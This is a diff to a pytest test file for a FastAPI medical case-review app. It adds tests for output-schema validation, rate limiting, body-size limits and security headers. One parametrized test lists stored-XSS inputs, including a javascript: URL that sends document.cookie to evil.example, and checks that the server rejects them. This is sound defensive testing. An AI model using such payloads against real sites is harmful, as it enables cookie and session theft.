@@ -10,9 +10,10 @@ import os
 
 os.environ["DEMO_MODE"] = "true"
 
+import pytest
 from fastapi.testclient import TestClient
 
-from aegismed import cases, llm
+from aegismed import cases, llm, ratelimit
 from aegismed.demo_data import EXAMPLE_CASE
 from aegismed.main import app
 
@@ -23,6 +24,16 @@ VALID_CASE = {
     "history": "maternal uncle died of renal failure",
     "labs": "proteinuria; LVH on ECG",
 }
+
+
+@pytest.fixture(autouse=True)
+def _reset_rate_limit_buckets():
+    # All requests in this module share one TestClient (one simulated client
+    # IP), so without a reset the per-test request counts would accumulate
+    # across the whole file and later tests could get spuriously 429'd.
+    ratelimit.reset()
+    yield
+    ratelimit.reset()
 
 
 def test_diagnose_defaults_to_us_region():
@@ -67,6 +78,8 @@ def test_save_case_with_precomputed_board_output_skips_rerun(monkeypatch, tmp_pa
 
     monkeypatch.setattr("aegismed.main.orchestrator.diagnose", _boom)
 
+    # Only the required fields are given here — the rest of BoardOutput's
+    # fields default to empty, proving a minimal-but-valid shape is accepted.
     precomputed = {"synthesis": "EXACT SYNTHESIS FROM SCREEN", "disclaimer": "d", "demo_mode": True, "region": "uk"}
     resp = client.post(
         "/api/cases/save",
@@ -74,8 +87,133 @@ def test_save_case_with_precomputed_board_output_skips_rerun(monkeypatch, tmp_pa
     )
     assert resp.status_code == 200
     data = resp.json()
-    assert data["board_output"] == precomputed
     assert data["board_output"]["synthesis"] == "EXACT SYNTHESIS FROM SCREEN"
+    assert data["board_output"]["region"] == "uk"
+
+
+def test_save_case_accepts_real_diagnose_output_as_board_output(monkeypatch, tmp_path):
+    """A genuine /api/diagnose result must always satisfy BoardOutput's shape."""
+    monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
+
+    diagnose_resp = client.post("/api/diagnose", json=VALID_CASE)
+    board_output = diagnose_resp.json()
+
+    save_resp = client.post(
+        "/api/cases/save",
+        json={**VALID_CASE, "board_output": board_output, "submitted_by": "Dr. Test"},
+    )
+    assert save_resp.status_code == 200
+    assert save_resp.json()["board_output"]["synthesis"] == board_output["synthesis"]
+
+
+def test_save_case_accepts_teaching_case_output_with_match_summary(monkeypatch, tmp_path):
+    monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
+
+    teaching_resp = client.post(
+        "/api/teaching/case",
+        json={**VALID_CASE, "expected_diagnosis": "Fabry disease"},
+    )
+    board_output = teaching_resp.json()
+
+    save_resp = client.post(
+        "/api/cases/save",
+        json={**VALID_CASE, "board_output": board_output, "submitted_by": "Dr. Test"},
+    )
+    assert save_resp.status_code == 200
+    assert save_resp.json()["board_output"]["match_summary"]["expected_diagnosis"] == "Fabry disease"
+
+
+def test_save_case_rejects_board_output_missing_required_field(monkeypatch, tmp_path):
+    monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
+
+    fabricated = {"demo_mode": True}  # no "synthesis", no "disclaimer"
+    resp = client.post(
+        "/api/cases/save",
+        json={**VALID_CASE, "board_output": fabricated, "submitted_by": "Dr. Test"},
+    )
+    assert resp.status_code == 422
+
+
+def test_save_case_rejects_board_output_with_wrong_field_types(monkeypatch, tmp_path):
+    monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
+
+    fabricated = {
+        "synthesis": "1. Made up diagnosis",
+        "disclaimer": "d",
+        "demo_mode": True,
+        # specialist_opinions must be a list of {specialty, opinion} objects.
+        "specialist_opinions": ["not an opinion object"],
+    }
+    resp = client.post(
+        "/api/cases/save",
+        json={**VALID_CASE, "board_output": fabricated, "submitted_by": "Dr. Test"},
+    )
+    assert resp.status_code == 422
+
+
+def test_save_case_rejects_oversized_board_output_field(monkeypatch, tmp_path):
+    monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
+
+    fabricated = {
+        "synthesis": "x" * 20001,  # over BoardOutput's max_length
+        "disclaimer": "d",
+        "demo_mode": True,
+    }
+    resp = client.post(
+        "/api/cases/save",
+        json={**VALID_CASE, "board_output": fabricated, "submitted_by": "Dr. Test"},
+    )
+    assert resp.status_code == 422
+
+
+@pytest.mark.parametrize("dangerous_url", [
+    "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "vbscript:msgbox(1)",
+])
+def test_save_case_rejects_non_http_reference_urls(monkeypatch, tmp_path, dangerous_url):
+    """A reference link renders as a clickable <a href> for other clinicians
+    (static/index.html linkList()) — a javascript:/data: URL there is a
+    one-click stored XSS, so board_output must not be allowed to carry one."""
+    monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
+
+    fabricated = {
+        "synthesis": "1. Fabry disease",
+        "disclaimer": "d",
+        "demo_mode": True,
+        "references": [
+            {"diagnosis": "Fabry disease", "links": [{"label": "Click me", "url": dangerous_url}]},
+        ],
+    }
+    resp = client.post(
+        "/api/cases/save",
+        json={**VALID_CASE, "board_output": fabricated, "submitted_by": "Dr. Test"},
+    )
+    assert resp.status_code == 422
+
+
+def test_save_case_accepts_legitimate_http_and_https_reference_urls(monkeypatch, tmp_path):
+    monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
+
+    fabricated = {
+        "synthesis": "1. Fabry disease",
+        "disclaimer": "d",
+        "demo_mode": True,
+        "references": [{
+            "diagnosis": "Fabry disease",
+            "links": [
+                {"label": "PubMed", "url": "https://pubmed.ncbi.nlm.nih.gov/?term=Fabry"},
+                {"label": "Orphanet", "url": "http://www.orpha.net/en/disease/detail/324"},
+            ],
+        }],
+    }
+    resp = client.post(
+        "/api/cases/save",
+        json={**VALID_CASE, "board_output": fabricated, "submitted_by": "Dr. Test"},
+    )
+    assert resp.status_code == 200
+    assert len(resp.json()["board_output"]["references"][0]["links"]) == 2
 
 
 def test_save_case_without_board_output_runs_the_board(monkeypatch, tmp_path):
@@ -244,3 +382,76 @@ def test_add_comment_success(monkeypatch, tmp_path):
 
     entry = cases.load_case(case_id)
     assert entry["team_comments"][0]["text"] == "Agree with the differential."
+
+
+# --- rate limiting -----------------------------------------------------------------
+
+
+def test_diagnose_returns_429_once_rate_limit_exceeded(monkeypatch):
+    monkeypatch.setenv("RATE_LIMIT_PER_MINUTE", "2")
+
+    for _ in range(2):
+        assert client.post("/api/diagnose", json=VALID_CASE).status_code == 200
+
+    resp = client.post("/api/diagnose", json=VALID_CASE)
+    assert resp.status_code == 429
+    assert "Retry-After" in resp.headers
+
+
+def test_rate_limit_is_disabled_when_set_to_zero(monkeypatch):
+    monkeypatch.setenv("RATE_LIMIT_PER_MINUTE", "0")
+
+    for _ in range(5):
+        assert client.post("/api/diagnose", json=VALID_CASE).status_code == 200
+
+
+def test_read_only_endpoints_are_not_rate_limited(monkeypatch):
+    monkeypatch.setenv("RATE_LIMIT_PER_MINUTE", "1")
+
+    # Use up /api/diagnose's budget...
+    assert client.post("/api/diagnose", json=VALID_CASE).status_code == 200
+    assert client.post("/api/diagnose", json=VALID_CASE).status_code == 429
+
+    # ...but plain reads are a different (unlimited) code path entirely.
+    for _ in range(5):
+        assert client.get("/health").status_code == 200
+        assert client.get("/api/example-case").status_code == 200
+
+
+# --- request body size limit --------------------------------------------------------
+
+
+def test_oversized_request_body_returns_413(monkeypatch):
+    monkeypatch.setenv("MAX_REQUEST_BODY_BYTES", "100")
+
+    resp = client.post("/api/diagnose", json=VALID_CASE)  # well over 100 bytes as JSON
+
+    assert resp.status_code == 413
+
+
+def test_request_body_within_limit_is_unaffected(monkeypatch):
+    monkeypatch.setenv("MAX_REQUEST_BODY_BYTES", "1000000")
+
+    resp = client.post("/api/diagnose", json=VALID_CASE)
+
+    assert resp.status_code == 200
+
+
+# --- security response headers ------------------------------------------------------
+
+
+def test_responses_carry_security_headers():
+    resp = client.get("/health")
+
+    assert resp.headers["X-Content-Type-Options"] == "nosniff"
+    assert resp.headers["X-Frame-Options"] == "DENY"
+    assert "default-src 'self'" in resp.headers["Content-Security-Policy"]
+
+
+def test_security_headers_present_even_on_413_response(monkeypatch):
+    monkeypatch.setenv("MAX_REQUEST_BODY_BYTES", "100")
+
+    resp = client.post("/api/diagnose", json=VALID_CASE)
+
+    assert resp.status_code == 413
+    assert resp.headers["X-Content-Type-Options"] == "nosniff"
